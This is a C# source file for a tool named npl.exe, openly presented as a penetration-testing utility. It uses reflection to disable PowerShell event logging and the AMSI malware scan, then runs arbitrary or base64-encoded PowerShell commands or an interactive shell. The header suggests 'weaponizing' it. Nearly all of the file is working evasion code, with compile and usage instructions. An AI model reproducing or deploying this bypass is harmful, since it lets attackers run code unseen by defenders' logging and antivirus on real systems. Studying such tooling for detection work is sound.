using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Reflection;

/*
Author: Reigning Shells

Derived From: https://github.com/Ben0xA/nps
              https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs

This is npl.exe or No PowerShell Logging.  Completely derived from others' work, 
just a way to illustrate how to entirely bypass PowerShell logging and AMSI.  
This is not intended to be used as is on anything other than a simple one-off 
penetration test.  For a real, long term, engagement only the necessary functionality
should be extracted from this and weaponized.

How to compile:
===============
c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:npl.exe npl.cs

How to use:
============
npl.exe -shell
npl.exe "{powershell single command}"
npl.exe "& {commands; semi-colon; separated}"
npl.exe -encodedcommand {base64_encoded_command}
npl.exe -encode "commands to encode to base64"
npl.exe -decode {base64_encoded_command}
*/

namespace npl
{
    class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();

            // Disable Logging
            var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (PSEtwLogProvider != null)
            {
                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                EtwProvider.SetValue(null, EventProvider);
            }

            // Disable AMSI
            var AmsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
            if (AmsiUtils != null)
            {
                AmsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            }

            if (args.Length >= 1)
            {
                if (args[0].ToLower() == "-encode")
                {
                    if(args.Length == 2)
                    {
                        Byte[] bytes = System.Text.Encoding.Unicode.GetBytes(args[1]);
                        Console.WriteLine(System.Convert.ToBase64String(bytes));
                    }
                    else 
                    {
                        Console.WriteLine("usage: npl.exe -encode \"& commands; separated; by; semicolons;\"");
                    }
                }
                else if (args[0].ToLower() == "-decode")
                {
                    if (args.Length == 2)
                    {
                        String cmd = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(args[1]));
                        Console.WriteLine(cmd);
                    }
                    else
                    {
                        Console.WriteLine("usage: npl.exe -decode {base_64_string}");
                    }
                }
                else if (args[0].ToLower() == "-shell")
                {
                    while (true)
                    {
                        ps.AddScript("pwd");
                        string pwd = ps.Invoke()[0].ToString();
                        string prompt = "PS " + pwd + "> ";

                        Console.Write(prompt);
                        var input = Console.ReadLine();

                        if (string.IsNullOrEmpty(input))
                        {
                            continue;
                        }

                        if (input.ToLower() == "exit")
                        {
                            break;
                        }

                        ps.AddScript(input);
                        Invoke(ps);
                        ps.Commands.Clear();
                    }
                }
                else 
                {
                    if (args[0].ToLower() == "-encodedcommand" || args[0].ToLower() == "-enc")
                    {
                        String script = "";
                        for (int argidx = 1; argidx < args.Length; argidx++)
                        {
                            script += System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(args[argidx]));
                        }
                        ps.AddScript(script);
                        Invoke(ps);
                    }
                    else
                    {
                        String script = "";
                        for (int argidx = 0; argidx < args.Length; argidx++)
                        {
                            script += @args[argidx];
                        }
                        ps.AddScript(script);
                        Invoke(ps);
                    }

                }                
            }
            else
            {
                Console.WriteLine("\r\nusage:\r\nnpl.exe -shell\r\nnpl.exe \"{powershell single command}\"\r\nnpl.exe \"& {commands; semi-colon; separated}\"\r\nnpl.exe -encodedcommand {base64_encoded_command}\r\nnpl.exe -encode \"commands to encode to base64\"\r\nnpl.exe -decode {base64_encoded_command}");
            }
        }
        private static void Invoke(PowerShell ps)
        {
            Collection<PSObject> output = null;

            try
            {
                output = ps.Invoke();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error while executing the script.\r\n" + e.Message.ToString());
            }

            if (output != null)
            {
                Console.WriteLine("");

                foreach (PSObject rtnItem in output)
                {
                    Console.WriteLine(rtnItem.ToString());
                }

                if (output.Count > 0)
                {
                    Console.WriteLine("");
                }
            }
        }
    }
}
